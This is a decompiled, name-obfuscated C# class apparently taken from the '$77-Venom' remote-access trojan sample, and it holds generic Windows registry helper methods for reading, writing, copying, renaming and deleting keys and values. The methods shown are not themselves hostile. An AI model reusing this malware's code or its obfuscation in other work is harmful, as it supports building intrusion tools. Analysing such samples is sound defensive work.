// Decompiled with JetBrains decompiler
// Type: 馕ﯫ팹褳淣ﾃ⣭ꬉ獬臎鼥ꘑ့閝术슙갋旹˥谉
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;

public static class 馕ﯫ팹褳淣ﾃ\u28EDꬉ獬臎鼥ꘑ့閝术슙갋旹\u02E5谉
{
  private static bool IsNameOrValueNull(this string keyName, RegistryKey key) => string.IsNullOrEmpty(keyName) || key == null;

  public static string GetValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
  {
    try
    {
      return key.GetValue(keyName, (object) defaultValue).ToString();
    }
    catch
    {
      return defaultValue;
    }
  }

  public static RegistryKey OpenReadonlySubKeySafe(this RegistryKey key, string name)
  {
    try
    {
      return key.OpenSubKey(name, false);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static RegistryKey OpenWritableSubKeySafe(this RegistryKey key, string name)
  {
    try
    {
      return key.OpenSubKey(name, true);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static RegistryKey CreateSubKeySafe(this RegistryKey key, string name)
  {
    try
    {
      return key.CreateSubKey(name);
    }
    catch
    {
      return (RegistryKey) null;
    }
  }

  public static bool DeleteSubKeyTreeSafe(this RegistryKey key, string name)
  {
    try
    {
      key.DeleteSubKeyTree(name, true);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool RenameSubKeySafe(this RegistryKey key, string oldName, string newName)
  {
    try
    {
      key.CopyKey(oldName, newName);
      key.DeleteSubKeyTree(oldName);
      return true;
    }
    catch
    {
      key.DeleteSubKeyTreeSafe(newName);
      return false;
    }
  }

  public static void CopyKey(this RegistryKey key, string oldName, string newName)
  {
    using (RegistryKey subKey = key.CreateSubKey(newName))
    {
      using (RegistryKey sourceKey = key.OpenSubKey(oldName, true))
        馕ﯫ팹褳淣ﾃ\u28EDꬉ獬臎鼥ꘑ့閝术슙갋旹\u02E5谉.賱楣宯俟墴\uEDA1ፄ瑞铎닥쏏䔃燦㣩\u22AF蘗ꈧ\uFFFD\uE51E쉢(sourceKey, subKey);
    }
  }

  private static void 賱楣宯俟墴\uEDA1ፄ瑞铎닥쏏䔃燦㣩\u22AF蘗ꈧ\uFFFD\uE51E쉢(
    RegistryKey sourceKey,
    RegistryKey destKey)
  {
    foreach (string valueName in sourceKey.GetValueNames())
    {
      object obj = sourceKey.GetValue(valueName);
      RegistryValueKind valueKind = sourceKey.GetValueKind(valueName);
      destKey.SetValue(valueName, obj, valueKind);
    }
    foreach (string subKeyName in sourceKey.GetSubKeyNames())
    {
      using (RegistryKey sourceKey1 = sourceKey.OpenSubKey(subKeyName))
      {
        using (RegistryKey subKey = destKey.CreateSubKey(subKeyName))
          馕ﯫ팹褳淣ﾃ\u28EDꬉ獬臎鼥ꘑ့閝术슙갋旹\u02E5谉.賱楣宯俟墴\uEDA1ፄ瑞铎닥쏏䔃燦㣩\u22AF蘗ꈧ\uFFFD\uE51E쉢(sourceKey1, subKey);
      }
    }
  }

  public static bool SetValueSafe(
    this RegistryKey key,
    string name,
    object data,
    RegistryValueKind kind)
  {
    try
    {
      key.SetValue(name, data, kind);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool DeleteValueSafe(this RegistryKey key, string name)
  {
    try
    {
      key.DeleteValue(name);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool RenameValueSafe(this RegistryKey key, string oldName, string newName)
  {
    try
    {
      key.CopyValue(oldName, newName);
      key.DeleteValue(oldName);
      return true;
    }
    catch
    {
      key.DeleteValueSafe(newName);
      return false;
    }
  }

  public static void CopyValue(this RegistryKey key, string oldName, string newName)
  {
    RegistryValueKind valueKind = key.GetValueKind(oldName);
    object obj = key.GetValue(oldName);
    key.SetValue(newName, obj, valueKind);
  }

  public static bool ContainsSubKey(this RegistryKey key, string name)
  {
    foreach (string subKeyName in key.GetSubKeyNames())
    {
      if (subKeyName == name)
        return true;
    }
    return false;
  }

  public static bool ContainsValue(this RegistryKey key, string name)
  {
    foreach (string valueName in key.GetValueNames())
    {
      if (valueName == name)
        return true;
    }
    return false;
  }

  public static IEnumerable<string> GetFormattedKeyValues(this RegistryKey key)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    馕ﯫ팹褳淣ﾃ\u28EDꬉ獬臎鼥ꘑ့閝术슙갋旹\u02E5谉.\uEA20錋\u2463\uE444\uE7DD鴏\uFFFDꎁ剷틿ꦯ\uE03F슌䨏ܗɉ㰻魾骛ᚦ 錋鴏ꎁ剷틿ꦯ슌䨏ܗɉ㰻魾骛ᚦ = new 馕ﯫ팹褳淣ﾃ\u28EDꬉ獬臎鼥ꘑ့閝术슙갋旹\u02E5谉.\uEA20錋\u2463\uE444\uE7DD鴏\uFFFDꎁ剷틿ꦯ\uE03F슌䨏ܗɉ㰻魾骛ᚦ();
    // ISSUE: reference to a compiler-generated field
    錋鴏ꎁ剷틿ꦯ슌䨏ܗɉ㰻魾骛ᚦ.꽻屆P\u2601偹ꊲᮍﻘⷤꁝ䄖峴賱\u1A8C鱉嚐ﾪ̈\uAA3B\uFFFD = key;
    // ISSUE: reference to a compiler-generated field
    if (錋鴏ꎁ剷틿ꦯ슌䨏ܗɉ㰻魾骛ᚦ.꽻屆P\u2601偹ꊲᮍﻘⷤꁝ䄖峴賱\u1A8C鱉嚐ﾪ̈\uAA3B\uFFFD != null)
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      foreach (string keyName in ((IEnumerable<string>) 錋鴏ꎁ剷틿ꦯ슌䨏ܗɉ㰻魾骛ᚦ.꽻屆P\u2601偹ꊲᮍﻘⷤꁝ䄖峴賱\u1A8C鱉嚐ﾪ̈\uAA3B\uFFFD.GetValueNames()).Where<string>(錋鴏ꎁ剷틿ꦯ슌䨏ܗɉ㰻魾骛ᚦ.晩螝橡\uED5E皱Ἇ툶悘庙\uE396츊ℕ賶\uF52Eḇ麮峵㼣뉣똜 ?? (錋鴏ꎁ剷틿ꦯ슌䨏ܗɉ㰻魾骛ᚦ.晩螝橡\uED5E皱Ἇ툶悘庙\uE396츊ℕ賶\uF52Eḇ麮峵㼣뉣똜 = new Func<string, bool>(錋鴏ꎁ剷틿ꦯ슌䨏ܗɉ㰻魾骛ᚦ.ᆍ䓸寧Ⳛ䃇尮嘘纥䐶\u2FEA士뫃锑ⷎ턩㴄ሒ攈瑧㻎))).Where<string>((Func<string, bool>) (k => !string.IsNullOrEmpty(k))))
      {
        // ISSUE: reference to a compiler-generated field
        yield return string.Format("{0}||{1}", (object) keyName, (object) 錋鴏ꎁ剷틿ꦯ슌䨏ܗɉ㰻魾骛ᚦ.꽻屆P\u2601偹ꊲᮍﻘⷤꁝ䄖峴賱\u1A8C鱉嚐ﾪ̈\uAA3B\uFFFD.GetValueSafe(keyName));
      }
    }
  }

  public static object GetDefault(this RegistryValueKind valueKind)
  {
    switch (valueKind)
    {
      case RegistryValueKind.String:
      case RegistryValueKind.ExpandString:
        return (object) "";
      case RegistryValueKind.Binary:
        return (object) new byte[0];
      case RegistryValueKind.DWord:
        return (object) 0;
      case RegistryValueKind.MultiString:
        return (object) new string[0];
      case RegistryValueKind.QWord:
        return (object) 0L;
      default:
        return (object) null;
    }
  }
}
